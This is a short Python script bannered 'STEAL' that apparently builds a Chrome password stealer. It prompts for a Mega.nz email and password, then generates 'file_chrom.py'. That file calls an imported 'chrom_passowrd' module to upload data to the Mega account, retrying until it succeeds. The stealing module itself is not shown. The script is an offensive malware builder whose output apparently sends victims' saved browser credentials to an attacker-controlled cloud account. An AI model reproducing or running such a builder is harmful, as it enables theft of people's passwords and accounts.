import sys , time
import colored
from colored import stylize , fg , attr
bannar = """

  ██████ ▄▄▄█████▓▓█████ ▄▄▄       ██▓    
▒██    ▒ ▓  ██▒ ▓▒▓█   ▀▒████▄    ▓██▒    
░ ▓██▄   ▒ ▓██░ ▒░▒███  ▒██  ▀█▄  ▒██░    
  ▒   ██▒░ ▓██▓ ░ ▒▓█  ▄░██▄▄▄▄██ ▒██░    
▒██████▒▒  ▒██▒ ░ ░▒████▒▓█   ▓██▒░██████▒
▒ ▒▓▒ ▒ ░  ▒ ░░   ░░ ▒░ ░▒▒   ▓▒█░░ ▒░▓  ░
░ ░▒  ░ ░    ░     ░ ░  ░ ▒   ▒▒ ░░ ░ ▒  ░
░  ░  ░    ░         ░    ░   ▒     ░ ░   
      ░              ░  ░     ░  ░    ░  ░
                                           By:Mido-D3vil
"""
def merry():
	bannar_color = colored.fg("orange_red_1") + colored.attr("bold")
	for i in bannar:
		time.sleep(0.00000000000001)
		sys.stdout.write(stylize(i, bannar_color))
		sys.stdout.flush()
def build_():
	with open("file_chrom.py","w+") as file:
		e_color = fg("sky_blue_1")
		p_color = fg("sky_blue_1")
		email = input(fg("light_green_2")+"[+]"+e_color+"email (Mega'https://mega.nz/') :>> "+fg("sky_blue_2"))
		password= input(fg("light_green_2")+"[+]"+p_color+"password (Mega'https://mega.nz/') :>>  "+fg("dark_gray"))
		file.write("import chrom_passowrd\n")
		file.write("from time import sleep\n")
		#file.write("x_up = chrom_passowrd.up("+"'"+email + "'" +"," + "'" + password +"'" + ")" + "\n")
		file.write("""
def run():
	if __name__ == "__main__":
		while 1:
			try:
""")
		file.write("				"+"x_up = chrom_passowrd.up("+"'"+email + "'" +"," + "'" + password +"'" + ")" + "\n")
		file.write("""
				exit()
			except Exception:
				sleep(5)
""")
		file.write(""" 
run()
""")
		file.close()
try:
	merry()
	build_()
except KeyboardInterrupt:
	exit()

